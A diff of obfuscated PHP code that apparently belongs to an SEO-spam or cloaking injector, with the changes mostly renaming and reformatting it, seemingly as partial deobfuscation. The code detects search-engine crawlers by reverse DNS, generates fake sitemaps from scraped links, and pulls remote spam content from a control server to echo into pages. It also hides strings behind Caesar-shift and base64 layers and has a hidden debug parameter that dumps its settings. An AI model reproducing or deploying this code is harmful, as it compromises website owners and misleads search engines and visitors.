@@ -52,8 +52,8 @@ foreach($fkeys as $i=>$fkey){
 #echo preg_replace;
 #exit();
 
-// Decode 64?
-function l1vS($l1R7s){
+// Decode 64
+function decode_msg($l1R7s){
     $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=$";
     $l1mxmSUX = $l1DXSnu = $l1yBzHz5 = "";
     $l14 = $l1uP75 = $l1t = $l1K = "";
@@ -93,7 +93,7 @@ function l1FLe62h($input=''){
         // Caesar shift
         $output .= chr(ord($c)+1);
     }
-    return l1vS($output);
+    return decode_msg($output);
 }
 
 //echo unserialize;
@@ -525,6 +525,7 @@ function l1gVD2yX(){
     return false;
 }
 
+/* Make sure bot is from correct source */
 function l1n($l12,$l1uiO){
     $l1U5o = array("google"=>array("Googlebot","googlebot.com",),
                    "yahoo"=>array("Yahoo!","inktomisearch.com",),
@@ -536,14 +537,12 @@ function l1n($l12,$l1uiO){
         return false;
     }
 
-    if(empty($l1uiO)){
-        return false;
-    }
+    if(empty($l1uiO)) return false;
 
     foreach($l1U5o as$l1xw=>$l1NuWnWf){
         if(stripos($l1uiO,$l1NuWnWf[0])!==false){
-            $l16Xp=gethostbyaddr($l12);
-            if($l16Xp&&stripos($l16Xp,$l1NuWnWf[1])!==false){
+            $l16Xp = gethostbyaddr($l12);
+            if($l16Xp && stripos($l16Xp,$l1NuWnWf[1])!==false){
                 return$l1xw;
             }
         }
@@ -565,7 +564,7 @@ function l15w($l1WoAo5U,$l1OZb,$l1S=array()){
             }
         }
     }
-    return$l1Lp;
+    return $l1Lp;
 }
 
 /* Convert html entities and vice-versa */
@@ -587,9 +586,9 @@ function l1kw6($string='',$mode=0){
 }
 
 function l1RnVra($l1P=0,$l1X='3~5',$l108=-1){
-    $l16=range('a','z');
-    $l1xi=range('A','Z');
-    $l1l=range(0,9);
+    $l16 = range('a','z');
+    $l1xi = range('A','Z');
+    $l1l = range(0,9);
 
     switch($l1P){
         case 0:$l1i052=$l16;
@@ -627,7 +626,7 @@ function l19($l1SDKs){
     $l1O = l1BSTEtn(l1O2($l1SDKs));
     $l1BRS[] = $l1go;
 
-    foreach($l1O as$l184039L){
+    foreach($l1O as $l184039L){
         $_SERVER["REQUEST_URI"]="/$l184039L";
         $l1BRS[]=l1J('',0,$l1go);
     }
@@ -679,21 +678,26 @@ function l1vJ($l1qMwO){
 }
 
 function l1BSTEtn($l1bC){
-    global$l1Ni6;
-    $l16Hy2G=array();
+    global $l1Ni6;
+    $l16Hy2G = array();
     preg_match_all("/<a.*?href=['\"]?(.*?)['\"\s>]/si",$l1bC,$l1TJWV);
+
     if(isset($l1TJWV[1])&&!empty($l1TJWV[1])){
-    foreach($l1TJWV[1]as$l1je2vbZ){
-    $l1je2vbZ=trim($l1je2vbZ);
-    if($l1je2vbZ!=''){
-    $l1je2vbZ=preg_replace("/^(https?\:)?\/\/[^\/]+\/?/si",'',trim($l1je2vbZ));
-    $l1je2vbZ=preg_replace("/^[\/#]/si",'',$l1je2vbZ);
-    $l1je2vbZ=str_replace('\\','',$l1je2vbZ);
-    if($l1je2vbZ!=''&&!preg_match('/\.(jpg|jpeg|gif|png|bmp|svg)$/si',$l1je2vbZ)){
-    if(!in_array($l1je2vbZ,$l16Hy2G)){
-    $l16Hy2G[]=l1kw6($l1je2vbZ,1);
-    }}}}}
-    return$l16Hy2G;
+        foreach($l1TJWV[1]as$l1je2vbZ){
+            $l1je2vbZ=trim($l1je2vbZ);
+            if($l1je2vbZ!=''){
+                $l1je2vbZ=preg_replace("/^(https?\:)?\/\/[^\/]+\/?/si",'',trim($l1je2vbZ));
+                $l1je2vbZ=preg_replace("/^[\/#]/si",'',$l1je2vbZ);
+                $l1je2vbZ=str_replace('\\','',$l1je2vbZ);
+                if($l1je2vbZ!=''&&!preg_match('/\.(jpg|jpeg|gif|png|bmp|svg)$/si',$l1je2vbZ)){
+                    if(!in_array($l1je2vbZ,$l16Hy2G)){
+                        $l16Hy2G[]=l1kw6($l1je2vbZ,1);
+                    }
+                }
+            }
+        }
+    }
+    return $l16Hy2G;
 }
 
 function l1UT7($l1i=0){
@@ -707,7 +711,7 @@ function l1UT7($l1i=0){
             $l1ppW='s';
         }
     }
-    return$l1ppW;
+    return $l1ppW;
 }
 
 // Main function . No more function after this
@@ -782,8 +786,8 @@ function l1P9LVD($l15tGX=''){
     $l1f1oojq = sprintf("http%s://$l13K",l1UT7($l1EbALe[8]));
     $l1qv = str_replace("www.",'',$l13K);
 
-    $l1ekHESi=$l1c9=isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:'');
-    $l1ekHESi=$l1c9=($l1ekHESi==''?((isset($_SERVER["PATH_INFO"])&&$_SERVER["PATH_INFO"]!='')?$_SERVER["PATH_INFO"]:$l1ekHESi):$l1ekHESi);
+    $l1ekHESi = $l1c9 = isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:'');
+    $l1ekHESi = $l1c9 = ($l1ekHESi==''?((isset($_SERVER["PATH_INFO"])&&$_SERVER["PATH_INFO"]!='')?$_SERVER["PATH_INFO"]:$l1ekHESi):$l1ekHESi);
     $l1i=$l1f1oojq.$l1ekHESi;
     $l1bS3es='';
     $l1ko='';
@@ -953,23 +957,33 @@ function l1P9LVD($l15tGX=''){
     }
 
     if(!$l1t&&!$l1z){
-    return;
-    }if(in_array($l1M,$l1jBj79X)){
-    if(!isset($_GET)&&$l1c9==''){
-    $l1uH=true;
-    }else{
-    if(isset($_GET)&&empty($_GET)){
-    if($l1c9==''){
-    $l1uH=true;
-    }else{
-    if($l1c9==$l1M){
-    $l1uH=true;
-    }}}else{
-    if($l1c9==''){
-    $l1uH=true;
-    }}}}if(!$l1uH){
-    $l1ko='';
+        return;
     }
+
+    if(in_array($l1M,$l1jBj79X)){
+        if(!isset($_GET)&&$l1c9==''){
+            $l1uH=true;
+        }else{
+            if(isset($_GET)&&empty($_GET)){
+                if($l1c9==''){
+                    $l1uH=true;
+                }else{
+                    if($l1c9==$l1M){
+                        $l1uH=true;
+                    }
+                }
+            }else{
+                if($l1c9==''){
+                    $l1uH=true;
+                }
+            }
+        }
+    }
+
+    if(!$l1uH){
+        $l1ko='';
+    }
+
     $l1VQ=l1vJ($l1VQ);
     $l11ia=$l1VQ."?yid=%d&lid=%d&from=%s&jump=%d&action=%s&cache=%d&ver=2.1.0&fb=%s";
     $l1CEqH4="ls1";
@@ -1038,42 +1052,48 @@ function l1P9LVD($l15tGX=''){
     }if($l1t||$l1FP8t||$l1g){
     $l1VBV="\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
     $l1a="<loc>%s</loc>";
+
     if($l1g){
-    $l1jHQLt=array($l1f1oojq);
-    if($l1bS3es!=''){
-    $l1jHQLt[]=$l1Ni6;
+        $l1jHQLt=array($l1f1oojq);
+        if($l1bS3es!=''){
+            $l1jHQLt[]=$l1Ni6;
+        }
+        $l1WEPla=l1O2($l1f1oojq);
+        if($l1WEPla!=''){
+            $l1jHQLt=array_merge($l1jHQLt,l1BSTEtn($l1WEPla));
+            $l1jHQLt=array_unique($l1jHQLt);
+        }
+        header(sprintf($l13lq1,'x'));
+        echo $l1VBV;
+        @l1AeQJ($l1sH,$l1VBV);
+        $l1Nc=array();
+
+        if(!empty($l1jHQLt)){
+            foreach($l1jHQLt as$l1LtvM5){
+            if(count($l1Nc)>=100){
+                $l1gn=implode('',$l1Nc);
+                echo $l1gn;
+                @l1AeQJ($l1sH,$l1gn,'a');
+                $l1gn='';
+                $l1Nc=array();
+            }
+            $l1Nc[] = sprintf("\n\t\t<url>%s\n\t\t\t<lastmod>%s</lastmod>\n\t\t\t<changefreq>monthly</changefreq>\n\t\t</url>",sprintf($l1a,l1kw6(preg_match("/^https?\:\/\//si",$l1LtvM5)?$l1LtvM5:"$l1Ni6$l1LtvM5")),date("Y-m-d"));
+            }
+        }
+        if(!empty($l1Nc)){
+            $l1gn=implode('',$l1Nc);
+            echo $l1gn;
+            @l1AeQJ($l1sH,$l1gn,'a');
+            $l1gn='';
+            $l1Nc=array();
+        }
+
+        $l1FiZB="\n\t</urlset>";
+        echo $l1FiZB;
+        @l1AeQJ($l1sH,$l1FiZB,'a');
+        exit();
     }
-    $l1WEPla=l1O2($l1f1oojq);
-    if($l1WEPla!=''){
-    $l1jHQLt=array_merge($l1jHQLt,l1BSTEtn($l1WEPla));
-    $l1jHQLt=array_unique($l1jHQLt);
-    }
-    header(sprintf($l13lq1,'x'));
-    echo $l1VBV;
-    @l1AeQJ($l1sH,$l1VBV);
-    $l1Nc=array();
-    if(!empty($l1jHQLt)){
-    foreach($l1jHQLt as$l1LtvM5){
-    if(count($l1Nc)>=100){
-    $l1gn=implode('',$l1Nc);
-    echo $l1gn;
-    @l1AeQJ($l1sH,$l1gn,'a');
-    $l1gn='';
-    $l1Nc=array();
-    }
-    $l1Nc[]=sprintf("\n\t\t<url>%s\n\t\t\t<lastmod>%s</lastmod>\n\t\t\t<changefreq>monthly</changefreq>\n\t\t</url>",sprintf($l1a,l1kw6(preg_match("/^https?\:\/\//si",$l1LtvM5)?$l1LtvM5:"$l1Ni6$l1LtvM5")),date("Y-m-d"));
-    }}if(!empty($l1Nc)){
-    $l1gn=implode('',$l1Nc);
-    echo $l1gn;
-    @l1AeQJ($l1sH,$l1gn,'a');
-    $l1gn='';
-    $l1Nc=array();
-    }
-    $l1FiZB="\n\t</urlset>";
-    echo $l1FiZB;
-    @l1AeQJ($l1sH,$l1FiZB,'a');
-    exit();
-    }
+
     $l1Z4k=$l1Ni6;
     $l1yaqM=isset($_GET["html"])?(int)($_GET["html"]):'';
     if(file_exists($l1TE9)){
@@ -1122,7 +1142,7 @@ function l1P9LVD($l15tGX=''){
     if(!empty($l1US)){
     $l1QEn=0;
     $l1ut=$l17x=0;
-    foreach($l1US as$l1k0){
+    foreach($l1US as $l1k0){
     if($l1ut>=$l1EYB){
     break;
     }
@@ -1218,12 +1238,14 @@ function l1P9LVD($l15tGX=''){
     }}if(isset($_GET[$l1EkZsk])){
     echo sprintf("domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s",$l13dbLD,$l19,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,implode('',$l11ufJ),$l1c,$l1cdE);
     exit();
-    }if($l1WyZOKd){
-    if($l1ko!=''){
-        echo file_get_contents($l1ko);
     }
-    return;
+    if($l1WyZOKd){
+        if($l1ko!=''){
+            echo file_get_contents($l1ko);
+        }
+        return;
     }
+
     $l1Kr=l1O2($l11ia);
     $l1Kr=trim($l1Kr);
 
